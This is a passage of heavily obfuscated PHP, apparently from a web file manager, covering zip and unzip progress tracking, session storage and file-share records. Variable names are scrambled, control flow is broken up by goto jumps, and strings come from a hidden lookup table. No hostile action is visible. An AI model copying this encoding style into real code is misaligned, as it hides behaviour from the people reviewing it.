$eŸ­óó®Ã) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto bÄÌ†ÇÔë; bÄÌ†ÇÔë: $CÊÕŸƒŸÚ“ =& $_SERVER[›èö’ù¤]; parent::startAfter(); Hook::bind($CÊÕŸƒŸÚ“[1638], array($this, $CÊÕŸƒŸÚ“[1639])); goto bŠññİÜç”; bŠññİÜç”: Hook::bind($CÊÕŸƒŸÚ“[1113], array($this, $CÊÕŸƒŸÚ“[1640])); $Bô”‡’Õ‘… =& $this->task; $Bô”‡’Õ‘…[$CÊÕŸƒŸÚ“[1641]] = $CÊÕŸƒŸÚ“[1118]; goto a‡Î¢Â¨£; a‡Î¢Â¨£: if (!$Bô”‡’Õ‘…[$CÊÕŸƒŸÚ“[1454]]) { $Bô”‡’Õ‘…[$CÊÕŸƒŸÚ“[1454]] = LNG($CÊÕŸƒŸÚ“[1642]); } goto dÚÓÑÅ÷Â; dÚÓÑÅ÷Â: } protected function endAfter() { $Dô¬·Ğîß =& $_SERVER[›èö’ù¤]; parent::endAfter(); Hook::unbind($Dô¬·Ğîß[1638], array($this, $Dô¬·Ğîß[1639])); Hook::unbind($Dô¬·Ğîß[1113], array($this, $Dô¬·Ğîß[1640])); } public function updateAfter() { $Dº™‹Ìî =& $_SERVER[›èö’ù¤]; $BÉ–â¯†É =& $this->task; if (!$BÉ–â¯†É[$Dº™‹Ìî[1046]] || !$BÉ–â¯†É[$Dº™‹Ìî[747]]) { return; } if ($BÉ–â¯†É[$Dº™‹Ìî[1641]] == $Dº™‹Ìî[1118]) { $E¨ñ¾ŸÖƒÂ = 0; if ($BÉ–â¯†É[$Dº™‹Ìî[1597]]) { $E¨ñ¾ŸÖƒÂ = $BÉ–â¯†É[$Dº™‹Ìî[1598]] / $BÉ–â¯†É[$Dº™‹Ìî[1597]]; } $BÉ–â¯†É[$Dº™‹Ìî[1552]] = $E¨ñ¾ŸÖƒÂ * 0.3; } else { if ($BÉ–â¯†É[$Dº™‹Ìî[1641]] == $Dº™‹Ìî[311]) { $E¨ñ¾ŸÖƒÂ = $BÉ–â¯†É[$Dº™‹Ìî[1060]] / $BÉ–â¯†É[$Dº™‹Ìî[1046]]; $BÉ–â¯†É[$Dº™‹Ìî[1552]] = 0.3 + $E¨ñ¾ŸÖƒÂ * 0.4; } else { if ($BÉ–â¯†É[$Dº™‹Ìî[1641]] == $Dº™‹Ìî[107]) { $cÏ•ÒµÎŒÎ = 0; if ($BÉ–â¯†É[$Dº™‹Ìî[1599]] == $Dº™‹Ìî[107]) { $cÏ•ÒµÎŒÎ = $BÉ–â¯†É[$Dº™‹Ìî[1598]]; } $E¨ñ¾ŸÖƒÂ = ($BÉ–â¯†É[$Dº™‹Ìî[1602]] + $cÏ•ÒµÎŒÎ) / $BÉ–â¯†É[$Dº™‹Ìî[747]]; $BÉ–â¯†É[$Dº™‹Ìî[1552]] = 0.3 + 0.4 + $E¨ñ¾ŸÖƒÂ * 0.3; } } } if ($BÉ–â¯†É[$Dº™‹Ìî[1552]] > 0) { $BË„íò¯» = timeFloat() - $BÉ–â¯†É[$Dº™‹Ìî[773]] - $BÉ–â¯†É[$Dº™‹Ìî[1555]]; $BÉ–â¯†É[$Dº™‹Ìî[1556]] = $BË„íò¯» * (1 - $BÉ–â¯†É[$Dº™‹Ìî[1552]]) / $BÉ–â¯†É[$Dº™‹Ìî[1552]]; } } public function addFile($F†áò‰æ›‰) { goto Eà¼…å; fË¢©×ßÆ¬: $this->update(); goto a¯ğ¹¨äï±; Eà¼…å: $bÌ…åõŸø =& $_SERVER[›èö’ù¤]; $EÕöí•ì½ì =& $this->task; $BâÕæ¤ÆÄÜ = IO::info($F†áò‰æ›‰); goto dŞ—ƒá¡°»; D­ñŞÎƒ¿Ø: $EÕöí•ì½ì[$bÌ…åõŸø[1046]] = 1; $e£„Æ’åÍ“ = 0; $EÕöí•ì½ì[$bÌ…åõŸø[1606]] = array($bÌ…åõŸø[1607] => $e£„Æ’åÍ“ + 1, $bÌ…åõŸø[415] => $BâÕæ¤ÆÄÜ[$bÌ…åõŸø[28]], $bÌ…åõŸø[76] => $BâÕæ¤ÆÄÜ[$bÌ…åõŸø[76]], $bÌ…åõŸø[514] => $BâÕæ¤ÆÄÜ[$bÌ…åõŸø[514]] ? $BâÕæ¤ÆÄÜ[$bÌ…åõŸø[514]] : $BâÕæ¤ÆÄÜ[$bÌ…åõŸø[76]]); goto fË¢©×ßÆ¬; f¬„¿½ÕØ˜: $EÕöí•ì½ì[$bÌ…åõŸø[1048]] = $bÌ…åõŸø[1617]; $EÕöí•ì½ì[$bÌ…åõŸø[1599]] = $bÌ…åõŸø[1118]; $EÕöí•ì½ì[$bÌ…åõŸø[747]] = $BâÕæ¤ÆÄÜ[$bÌ…åõŸø[78]]; goto D­ñŞÎƒ¿Ø; dŞ—ƒá¡°»: $EÕöí•ì½ì[$bÌ…åõŸø[1595]] = $BâÕæ¤ÆÄÜ[$bÌ…åõŸø[28]]; $EÕöí•ì½ì[$bÌ…åõŸø[1597]] = $BâÕæ¤ÆÄÜ[$bÌ…åõŸø[78]]; $EÕöí•ì½ì[$bÌ…åõŸø[1598]] = 0; goto f¬„¿½ÕØ˜; a¯ğ¹¨äï±: } public function unzipAfter($Bõ¼‰ÏÁ£) { goto c™íë´ÑÇ; EÈßôÉ‘ø: $c—ÚùòËù‘ = IO::infoWithChildren($Bõ¼‰ÏÁ£); $E¼Ú´ÄØ± = 0; $AÃ¤µ±äğ¯[$ağÏë‡óòì[1606]] = array($ağÏë‡óòì[1607] => $E¼Ú´ÄØ± + 1, $ağÏë‡óòì[415] => $c—ÚùòËù‘[$ağÏë‡óòì[28]], $ağÏë‡óòì[76] => $c—ÚùòËù‘[$ağÏë‡óòì[76]], $ağÏë‡óòì[514] => $c—ÚùòËù‘[$ağÏë‡óòì[514]] ? $c—ÚùòËù‘[$ağÏë‡óòì[514]] : $c—ÚùòËù‘[$ağÏë‡óòì[76]]); goto CˆëËÄ•Õº; DÑ‹ŒËŸ°: $this->update(); self::log($ağÏë‡óòì[1643] . json_encode(array($AÃ¤µ±äğ¯, $c—ÚùòËù‘))); goto e—ÕóÍ‘¹á; f–ö½Í‰§¦: $AÃ¤µ±äğ¯[$ağÏë‡óòì[1595]] = $ağÏë‡óòì[33]; $AÃ¤µ±äğ¯[$ağÏë‡óòì[1602]] = 0; $AÃ¤µ±äğ¯[$ağÏë‡óòì[747]] = $c—ÚùòËù‘[$ağÏë‡óòì[78]]; goto DÑ‹ŒËŸ°; CîˆœàÑÑÜ: $AÃ¤µ±äğ¯[$ağÏë‡óòì[1060]] = 0; $AÃ¤µ±äğ¯[$ağÏë‡óòì[1597]] = 0; $AÃ¤µ±äğ¯[$ağÏë‡óòì[1598]] = 0; goto f–ö½Í‰§¦; c™íë´ÑÇ: $ağÏë‡óòì =& $_SERVER[›èö’ù¤]; $AÃ¤µ±äğ¯ =& $this->task; $AÃ¤µ±äğ¯[$ağÏë‡óòì[1641]] = $ağÏë‡óòì[107]; goto EÈßôÉ‘ø; CˆëËÄ•Õº: if ($c—ÚùòËù‘[$ağÏë‡óòì[29]] == $ağÏë‡óòì[193]) { $AÃ¤µ±äğ¯[$ağÏë‡óòì[1046]] = 1; } else { $AÃ¤µ±äğ¯[$ağÏë‡óòì[1046]] = $c—ÚùòËù‘[$ağÏë‡óòì[81]][$ağÏë‡óòì[79]]; } $AÃ¤µ±äğ¯[$ağÏë‡óòì[1048]] = $ağÏë‡óòì[33]; $AÃ¤µ±äğ¯[$ağÏë‡óòì[1599]] = 0; goto CîˆœàÑÑÜ; e—ÕóÍ‘¹á: } public function nameParse($cÔ³¶—È©) { goto cæÀç×¾ÙÌ; eŸ¬‰ŸĞïÂ: $this->update(); goto fí¥‹Àø¼; cæÀç×¾ÙÌ: $E¥‰•ˆ¢Õ˜ =& $_SERVER[›èö’ù¤]; $aìÀé•çŸ =& $this->task; if ($aìÀé•çŸ[$E¥‰•ˆ¢Õ˜[1641]] == $E¥‰•ˆ¢Õ˜[1118]) { $aìÀé•çŸ[$E¥‰•ˆ¢Õ˜[1641]] = $E¥‰•ˆ¢Õ˜[311]; $aìÀé•çŸ[$E¥‰•ˆ¢Õ˜[1602]] = 0; $aìÀé•çŸ[$E¥‰•ˆ¢Õ˜[747]] = 0; } goto c¤ù¤ò²‡Ø; c¤ù¤ò²‡Ø: $b¨œÀáä¯ = get_path_this($cÔ³¶—È©); if (strstr($b¨œÀáä¯, $E¥‰•ˆ¢Õ˜[95])) { $aìÀé•çŸ[$E¥‰•ˆ¢Õ˜[1060]] += 1; $aìÀé•çŸ[$E¥‰•ˆ¢Õ˜[1046]] += 1; } $aìÀé•çŸ[$E¥‰•ˆ¢Õ˜[1595]] = $cÔ³¶—È©; goto eŸ¬‰ŸĞïÂ; fí¥‹Àø¼: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $bÀÁÄäÛ =& $_SERVER[›èö’ù¤]; parent::startAfter(); Hook::bind($bÀÁÄäÛ[1644], array($this, $bÀÁÄäÛ[1639])); $CíÍœ·Çµ =& $this->task; $CíÍœ·Çµ[$bÀÁÄäÛ[1641]] = $bÀÁÄäÛ[1118]; if (!$CíÍœ·Çµ[$bÀÁÄäÛ[1454]]) { $CíÍœ·Çµ[$bÀÁÄäÛ[1454]] = LNG($bÀÁÄäÛ[1645]); } } protected function endAfter() { $aŒ‹¥«óÆ… =& $_SERVER[›èö’ù¤]; parent::endAfter(); Hook::unbind($aŒ‹¥«óÆ…[1644], array($this, $aŒ‹¥«óÆ…[1639])); } public function updateAfter() { $Aá•¯ÇÆ¢ =& $_SERVER[›èö’ù¤]; $cÚÆƒ¿–£Û =& $this->task; if (!$cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1046]] || !$cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[747]]) { return; } if ($cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1641]] == $Aá•¯ÇÆ¢[1118]) { $Eñ ò‰…‹Ô = $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1598]]; if ($cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1599]] != $Aá•¯ÇÆ¢[1118]) { $Eñ ò‰…‹Ô = 0; } $B‘ëƒ÷‰‘´ = ($cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1602]] + $Eñ ò‰…‹Ô) / $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[747]]; $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1552]] = $B‘ëƒ÷‰‘´ * 0.3; } else { if ($cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1641]] == $Aá•¯ÇÆ¢[311]) { $B‘ëƒ÷‰‘´ = $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1060]] / $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1046]]; $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1552]] = 0.3 + $B‘ëƒ÷‰‘´ * 0.5; } else { if ($cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1641]] == $Aá•¯ÇÆ¢[107]) { $B‘ëƒ÷‰‘´ = 0; if ($cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1597]]) { $B‘ëƒ÷‰‘´ = $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1598]] / $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1597]]; } $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1552]] = 0.3 + 0.5 + $B‘ëƒ÷‰‘´ * 0.2; } } } if ($cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1552]] > 0) { $e³œÉ¦³Ã = timeFloat() - $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[773]] - $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1555]]; $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1556]] = $e³œÉ¦³Ã * (1 - $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1552]]) / $cÚÆƒ¿–£Û[$Aá•¯ÇÆ¢[1552]]; } } public function copyFileStart($EŒˆÊ™¤ææ, $EØ…¡Ãİ£½, $Cµ—‰¤‡ª£, $F±‡ï¶‹«¢, $b„ö¿İ³ÇŸ, $B²“‹ƒ‚ˆ¹) { $dİğİİ¬²Á =& $_SERVER[›èö’ù¤]; parent::copyFileStart($EŒˆÊ™¤ææ, $EØ…¡Ãİ£½, $Cµ—‰¤‡ª£, $F±‡ï¶‹«¢, $b„ö¿İ³ÇŸ, $B²“‹ƒ‚ˆ¹); $båè²¯ÛÜ =& $this->task; if ($båè²¯ÛÜ[$dİğİİ¬²Á[1641]] == $dİğİİ¬²Á[311]) { $båè²¯ÛÜ[$dİğİİ¬²Á[1641]] = $dİğİİ¬²Á[107]; } $this->update(); } public function copyFileEnd($D¬¾å‰ï¶, $BÁàçˆŞæÀ, $C¸¯¿ó°¡ß, $b‡¼¢ğ÷Ÿß, $c£•²£Ç¾ö, $fªÇ×°½”) { $DìˆõØ˜İè =& $_SERVER[›èö’ù¤]; $Cè•¥Ïá½¸ =& $this->task; $Cè•¥Ïá½¸[$DìˆõØ˜İè[1598]] = $Cè•¥Ïá½¸[$DìˆõØ˜İè[1597]]; $Cè•¥Ïá½¸[$DìˆõØ˜İè[1602]] += $Cè•¥Ïá½¸[$DìˆõØ˜İè[1597]]; $Cè•¥Ïá½¸[$DìˆõØ˜İè[1599]] = $DìˆõØ˜İè[33]; $this->update(); } public function nameParse($eƒ—Ú‘ºÁ÷) { $F§áÚŸå† =& $_SERVER[›èö’ù¤]; $c÷¨‡†»… =& $this->task; if ($c÷¨‡†»…[$F§áÚŸå†[1060]] < $c÷¨‡†»…[$F§áÚŸå†[1046]]) { $EµÀ§Ÿš¥Ä = get_path_this($eƒ—Ú‘ºÁ÷); if (strstr($EµÀ§Ÿš¥Ä, $F§áÚŸå†[95])) { $c÷¨‡†»…[$F§áÚŸå†[1060]] += 1; } } if ($c÷¨‡†»…[$F§áÚŸå†[1641]] == $F§áÚŸå†[1118]) { $c÷¨‡†»…[$F§áÚŸå†[1641]] = $F§áÚŸå†[311]; } $c÷¨‡†»…[$F§áÚŸå†[1595]] = $eƒ—Ú‘ºÁ÷; $this->update(); } } goto E†İ’¼ö¶Ú; aÙ¸¾à…Ä: class SessionModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\155\x5f\163\x65\x73\163\151\157\x6e"; public function get($aˆõ¶¬»ô) { $bŠ´š“¹¢£ =& $_SERVER[›èö’ù¤]; $aÁÓ¥ÕÔ´¿ = $this->where(array($bŠ´š“¹¢£[1849] => $aˆõ¶¬»ô))->find(); if (!is_array($aÁÓ¥ÕÔ´¿)) { return !1; } return $aÁÓ¥ÕÔ´¿[$bŠ´š“¹¢£[739]]; } public function set($dšÜ­¬—®, $fÈÉ–¼Ôº, $A¸ä­­°·‚ = 3600) { $A²Ëà‚°©• =& $_SERVER[›èö’ù¤]; $BÜÔ ïã¾Ÿ = array($A²Ëà‚°©•[1849] => $dšÜ­¬—®, $A²Ëà‚°©•[1758] => $fÈÉ–¼Ôº, $A²Ëà‚°©•[1850] => $A¸ä­­°·‚ + time()); if (Session::get($A²Ëà‚°©•[1851])) { $BÜÔ ïã¾Ÿ[$A²Ëà‚°©•[1551]] = Session::get($A²Ëà‚°©•[1851]); } else { $BÜÔ ïã¾Ÿ[$A²Ëà‚°©•[1551]] = 0; } if ($this->get($dšÜ­¬—®)) { return $this->where(array($A²Ëà‚°©•[1849] => $dšÜ­¬—®))->save($BÜÔ ïã¾Ÿ); } else { return $this->add($BÜÔ ïã¾Ÿ, array(), !0); } } public function remove($bÏ­’—¶²) { return $this->where(array($_SERVER[›èö’ù¤][1849] => $bÏ­’—¶²))->delete(); } public function clearTimeout() { return $this->where($_SERVER[›èö’ù¤][1852] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\x61\162\145"; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\124\151\x6d\x65", "\164\151\x6d\145", "\151\156\x73\x65\x72\164\54\165\x70\x64\x61\164\x65", "\146\165\x6e\143\x74\x69\x6f\x6e"), array("\x63\x72\145\x61\x74\145\x54\x69\155\145", "\164\x69\155\145", "\151\x6e\x73\145\162\x74", "\146\165\x6e\x63\164\x69\x6f\156"), array("\157\160\164\x69\x6f\x6e\163", '', "\151\156\x73\145\162\164\x2c\x75\160\x64\x61\164\145\54\x73\x65\x6c\x65\143\x74", "\x6a\x73\157\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($EŒ´‘Íæ‡) { $D¾ö ŸŸÖÏ =& $_SERVER[›èö’ù¤]; $DéŠ¨é‚‹ = isset($EŒ´‘Íæ‡[0]) ? $EŒ´‘Íæ‡[0] : !1; return array($D¾ö ŸŸÖÏ[1853] => array(USER_ID, $D¾ö ŸŸÖÏ[1854]), $D¾ö ŸŸÖÏ[1796] => array($DéŠ¨é‚‹, $D¾ö ŸŸÖÏ[1855])); } protected function listSimple() { $Fîš–½ƒ‡‰ = array($_SERVER[›èö’ù¤][1551] => USER_ID); $fÜö„‚İ— = $this->field($this->fieldList)->where($Fîš–½ƒ‡‰)->select(); return $fÜö„‚İ— ? $fÜö„‚İ— : array(); } protected function getInfo($a’¦Œğùâ×, $D½¹ç—‚ğ½ = false) { $a²ï²Š‰‘ =& $_SERVER[›èö’ù¤]; if ($D½¹ç—‚ğ½) { return $this->_getShareInfo(array($a²ï²Š‰‘[483] => $a’¦Œğùâ×)); } $C¢Ğ¦åï¼ = $this->cacheFunctionGet($a²ï²Š‰‘[1798], $a’¦Œğùâ×); return $C¢Ğ¦åï¼; } public function getInfoByHash($fæÚéÍæñà) { return $this->_getShareInfo(array($_SERVER[›èö’ù¤][485] => $fæÚéÍæñà)); } public function getInfoByPath($AóîË‘¨İ) { $f‰‘¦÷„ =& $_SERVER[›èö’ù¤]; $DÙ°ïø¨é„ = array($f‰‘¦÷„[1551] => USER_ID, $f‰‘¦÷„[397] => $AóîË‘¨İ); return $this->_getShareInfo($DÙ°ïø¨é„); } public function getInfoBySourcePath($A´•ó©À¿Ğ) { $b¤ˆŒÖ•ö™ =& $_SERVER[›èö’ù¤]; $eÎ„ÌÚÂ…À = array($b¤ˆŒÖ•ö™[1551] => USER_ID, $b¤ˆŒÖ•ö™[1095] => $A´•ó©À¿Ğ); return $this->_getShareInfo($eÎ„ÌÚÂ…À); } private function _getShareInfo($d»ÈÙëö¹±) { goto BİÖ¼÷­ì; Då‘ƒÇæˆ : $d»ÈÙëö¹± = array($AäÊİæõ¦Ü[483] => $CÓåÓğ‡èÙ[$AäÊİæõ¦Ü[483]]); $c¸ÕšóïÌ = $AäÊİæõ¦Ü[1856]; $E¹Ä³Ü–¶ = Model($AäÊİæõ¦Ü[591])->order($AäÊİæõ¦Ü[395])->field($c¸ÕšóïÌ)->where($d»ÈÙëö¹±)->select(); goto CøÏ°›ÑèÛ; CøÏ°›ÑèÛ: if ($CÓåÓğ‡èÙ[$AäÊİæõ¦Ü[397]] == $AäÊİæõ¦Ü[191]) { $CÓåÓğ‡èÙ[$AäÊİæõ¦Ü[85]] = IO::info($CÓåÓğ‡èÙ[$AäÊİæõ¦Ü[1095]]); } else { $CÓåÓğ‡èÙ[$AäÊİæõ¦Ü[85]] = Model($AäÊİæõ¦Ü[1230])->pathInfo($CÓåÓğ‡èÙ[$AäÊİæõ¦Ü[397]]); } $CÓåÓğ‡èÙ[$AäÊİæõ¦Ü[1857]] = $E¹Ä³Ü–¶; return $CÓåÓğ‡èÙ; goto cæ…àÓ¼ìù; BİÖ¼÷­ì: $AäÊİæõ¦Ü =& $_SERVER[›èö’ù¤]; $CÓåÓğ‡èÙ = $this->where($d»ÈÙëö¹±)->find(); if (!$CÓåÓğ‡èÙ) { return !1; } goto Då‘ƒÇæˆ ; cæ…àÓ¼ìù: } protected function getInfoAuth($B™ÌéáÛÔŠ) { $eù™Ÿ¼Ÿ¯… =& $_SERVER[›èö’ù¤]; $C¶’›È©¾ = $this->getInfo($B™ÌéáÛÔŠ); $C¶’›È©¾[$eù™Ÿ¼Ÿ¯…[408]] = Model($eù™Ÿ¼Ÿ¯…[497])->authMake($C¶’›È©¾[$eù™Ÿ¼Ÿ¯…[1857]]); return $C¶’›È©¾; } protected function listData($a“ˆŸÂç« = null, $B¸‘ó¯İè = 300) { $b……›ä„® =& $_SERVER[›èö’ù¤]; $Fì¤¶‘¨È = array(array($b……›ä„®[488] => array($b……›ä„®[995], 0), $b……›ä„®[490] => array($b……›ä„®[995], 0), $b……›ä„®[1858] => $b……›ä„®[1812])); if ($a“ˆŸÂç« == $b……›ä„®[1859]) { $Fì¤¶‘¨È = array($b……›ä„®[488] => 1); } else { if ($a“ˆŸÂç« == $b……›ä„®[1080]) { $Fì¤¶‘¨È = array($b……›ä„®[490] => 1); } } $Fì¤¶‘¨È[$b……›ä„®[1551]] = USER_ID; $E¨ñ¸‚½‚ = $this->where($Fì¤¶‘¨È)->selectPage($B¸‘ó¯İè); return $E¨ñ¸‚½‚; } protected function listToMe($Fñƒ¥ÁÀ„ = 300) { goto b¶‡ƒË¤„à; dàµòëàÔˆ: if (!$b‚–ê§ï¡ë) { return $eç£”À«¸Ï; } $Fô“çù¹˜ = $fÂéÉ¼õœà[1861]; $f·„·Ü­‡í = array($fÂéÉ¼õœà[483] => array($fÂéÉ¼õœà[413], array_keys($b‚–ê§ï¡ë)), $fÂéÉ¼õœà[1551] => array($fÂéÉ¼õœà[997], $fÂéÉ¼õœà[191])); goto a Î»­ÄÏ; a Î»­ÄÏ: $B´„‘à¤‚õ = $this->field($Fô“çù¹˜)->where($f·„·Ü­‡í)->select(); foreach ($B´„‘à¤‚õ as $bªó±Ñ²‡ó => &$f®é‘êŒ†æ) { $f®é‘êŒ†æ[$fÂéÉ¼õœà[1857]] = $b‚–ê§ï¡ë[$f®é‘êŒ†æ[$fÂéÉ¼õœà[483]]]; } unset($f®é‘êŒ†æ); goto Aë¾Ì§·ïÀ; b¶‡ƒË¤„à: $fÂéÉ¼õœà =& $_SERVER[›èö’ù¤]; $D¼›ÉÍˆä = Model($fÂéÉ¼õœà[1860])->userGroupParents(USER_ID); $f·„·Ü­‡í = array($fÂéÉ¼õœà[575] => SourceModel::TYPE_USER, $fÂéÉ¼õœà[499] => USER_ID); goto aŠÃ¬´ô‡´; Aë¾Ì§·ïÀ: $cš©ïÖåïÔ = array($fÂéÉ¼õœà[1862] => $B´„‘à¤‚õ, $fÂéÉ¼õœà[1863] => $eç£”À«¸Ï[$fÂéÉ¼õœà[364]]); return $cš©ïÖåïÔ; goto Eã—¶ƒÃë‹; aŠÃ¬´ô‡´: if ($D¼›ÉÍˆä) { $f·„·Ü­‡í = array(array($fÂéÉ¼õœà[575] => SourceModel::TYPE_USER, $fÂéÉ¼õœà[499] => USER_ID), array($fÂéÉ¼õœà[575] => SourceModel::TYPE_GROUP, $fÂéÉ¼õœà[499] => array($fÂéÉ¼õœà[7], $D¼›ÉÍˆä)), $fÂéÉ¼õœà[1858] => $fÂéÉ¼õœà[1812]); } $eç£”À«¸Ï = Model($fÂéÉ¼õœà[591])->where($f·„·Ü­‡í)->selectPage($Fñƒ¥ÁÀ„); $b‚–ê§ï¡ë = array_to_keyvalue_group($eç£”À«¸Ï[$fÂéÉ¼õœà[367]], $fÂéÉ¼õœà[483]); goto dàµòëàÔˆ; Eã—¶ƒÃë‹: } protected function shareAdd($f‡öèÑÏ…³, $D×ºŸ­œ) { $E‰„Î¥Ï‰ =& $_SERVER[›èö’ù¤]; $Fƒ’Ü‹™œ» = $this->_addShareData($f‡öèÑÏ…³, $D×ºŸ­œ); if (!empty($D×ºŸ­œ[$E‰„Î¥Ï‰[1864]])) { $this->_shareAuthSet($Fƒ’Ü‹™œ», $D×ºŸ­œ[$E‰„Î¥Ï‰[1864]]); } $this->shareEventAdd($f‡öèÑÏ…³, $D×ºŸ­œ, $E‰„Î¥Ï‰[1083]); return $Fƒ’Ü‹™œ»; } protected function shareAddSystem($dïç´Õ×ù, $e…Ú‡‚Ä”) { $d¾ÌÂòÓğ =& $_SERVER[›èö’ù¤]; $Aµ”Ì¡Ö®¾ = $this->_addShareData($dïç´Õ×ù, $e…Ú‡‚Ä”, $d¾ÌÂòÓğ[1195]); $this->_shareAuthSet($Aµ”Ì¡Ö®¾, $e…Ú‡‚Ä”[$d¾ÌÂòÓğ[1864]]); return $Aµ”Ì¡Ö®¾; } private function shareEventAdd($a‰£öŠ‹Ú”, $Bæîöà¢¨Ø, $EĞÚë¦Ø²¦ = "\x61\x64\x64") { goto C Áõ£îŠ ; aê£ÍçÀ«: if ($CÉñ‘÷ƒµù[$bÉ¦‚‚Í ¬[488]] == $bÉ¦‚‚Í ¬[87] && $Bæîöà¢¨Ø[$bÉ¦‚‚Í ¬[488]] == $bÉ¦‚‚Í ¬[191]) { $B›ÛÚ„½á¦ = $bÉ¦‚‚Í ¬[1868]; } if ($CÉñ‘÷ƒµù[$bÉ¦‚‚Í ¬[490]] == $bÉ¦‚‚Í ¬[191] && $Bæîöà¢¨Ø[$bÉ¦‚‚Í ¬[490]] == $bÉ¦‚‚Í ¬[87]) { $B›ÛÚ„½á¦ = $bÉ¦‚‚Í ¬[1866]; } if ($CÉñ‘÷ƒµù[$bÉ¦‚‚Í ¬[490]] == $bÉ¦‚‚Í ¬[87] && $Bæîöà¢¨Ø[$bÉ¦‚‚Í ¬[490]] == $bÉ¦‚‚Í ¬[191]) { $B›ÛÚ„½á¦ = $bÉ¦‚‚Í ¬[1869]; } goto d‡¬å„®Ûø; d‡¬å„®Ûø: Model($bÉ¦‚‚Í ¬[559])->eventShare($a‰£öŠ‹Ú”, $B›ÛÚ„½á¦); return; goto dõÂÍ•—‘–; d®ãš×Òíå: $CÉñ‘÷ƒµù = $this->getInfoByPath($a‰£öŠ‹Ú”); $B›ÛÚ„½á¦ = $bÉ¦‚‚Í ¬[1867]; if ($CÉñ‘÷ƒµù[$bÉ¦‚‚Í ¬[488]] == $bÉ¦‚‚Í ¬[191] && $Bæîöà¢¨Ø[$bÉ¦‚‚Í ¬[488]] == $bÉ¦‚‚Í ¬[87]) { $B›ÛÚ„½á¦ = $bÉ¦‚‚Í ¬[1865]; } goto aê£ÍçÀ«; C Áõ£îŠ : $bÉ¦‚‚Í ¬ =& $_SERVER[›èö’ù¤]; if (!$a‰£öŠ‹Ú” || $a‰£öŠ‹Ú” == $bÉ¦‚‚Í ¬[191]) { return; } if ($EĞÚë¦Ø²¦ == $bÉ¦‚‚Í ¬[1083]) { if ($Bæîöà¢¨Ø[$bÉ¦‚‚Í ¬[488]] == $bÉ¦‚‚Í ¬[87]) { Model($bÉ¦‚‚Í ¬[559])->eventShare($a‰£öŠ‹Ú”, $bÉ¦‚‚Í ¬[1865]); } if ($Bæîöà¢¨Ø[$bÉ¦‚‚Í ¬[490]] == $bÉ¦‚‚Í ¬[87]) { Model($bÉ¦‚‚Í ¬[559])->eventShare($a‰£öŠ‹Ú”, $bÉ¦‚‚Í ¬[1866]); } return; } goto d®ãš×Òíå; dõÂÍ•—‘–: } private function _addShareData($d÷Î„±Š, $A·ÒßĞï÷ = array(), $FÔ’ß‡œã¬ = false) { goto DóÖ´¨ë­³; a˜È¼ÒÍõ¥: foreach ($A¾‹é²ÊÃÌ as $fÃ¨¬Ôİ²ù) { if (!isset($A·ÒßĞï÷[$fÃ¨¬Ôİ²ù])) { continue; } $a‡ÙÊÁÇë¸[$fÃ¨¬Ôİ²ù] = $A·ÒßĞï÷[$fÃ¨¬Ôİ²ù]; } $f‹º‚³åöŞ = $this->add($a‡ÙÊÁÇë¸); $A‰ÜçØ½˜ï = array($Eƒ¹…¾¬¼[485] => short_id($f‹º‚³åöŞ)); goto C¢éÃÖ†­; Eô×ğ­Î…: if (!$A·ÒßĞï÷[$Eƒ¹…¾¬¼[1454]]) { $A·ÒßĞï÷[$Eƒ¹…¾¬¼[1454]] = $e£›¿Æ·¤[$Eƒ¹…¾¬¼[28]]; } $a‡ÙÊÁÇë¸ = array($Eƒ¹…¾¬¼[1542] => $cÁğ…Íïëó, $Eƒ¹…¾¬¼[412] => $d÷Î„±Š, $Eƒ¹…¾¬¼[1454] => $Eƒ¹…¾¬¼[33], $Eƒ¹…¾¬¼[488] => 0, $Eƒ¹…¾¬¼[490] => 0, $Eƒ¹…¾¬¼[1095] => $Eƒ¹…¾¬¼[33], $Eƒ¹…¾¬¼[305] => $Eƒ¹…¾¬¼[33], $Eƒ¹…¾¬¼[875] => $Eƒ¹…¾¬¼[33], $Eƒ¹…¾¬¼[1871] => 0, $Eƒ¹…¾¬¼[1872] => 0, $Eƒ¹…¾¬¼[491] => 0, $Eƒ¹…¾¬¼[492] => $Eƒ¹…¾¬¼[33], $Eƒ¹…¾¬¼[485] => $Eƒ¹…¾¬¼[33]); $A¾‹é²ÊÃÌ = explode($Eƒ¹…¾¬¼[47], $Eƒ¹…¾¬¼[1873]); goto a˜È¼ÒÍõ¥; C¢éÃÖ†­: $this->where(array($Eƒ¹…¾¬¼[482] => $f‹º‚³åöŞ))->save($A‰ÜçØ½˜ï); return $f‹º‚³åöŞ; goto a†­èõ¨œ‚; DóÖ´¨ë­³: $Eƒ¹…¾¬¼ =& $_SERVER[›èö’ù¤]; $cÁğ…Íïëó = $FÔ’ß‡œã¬ == $Eƒ¹…¾¬¼[1195] ? 0 : USER_ID; $E”˜‘Ôã = array($Eƒ¹…¾¬¼[412] => $d÷Î„±Š, $Eƒ¹…¾¬¼[1542] => $cÁğ…Íïëó); goto bÙÆÅ¸Å†Á; 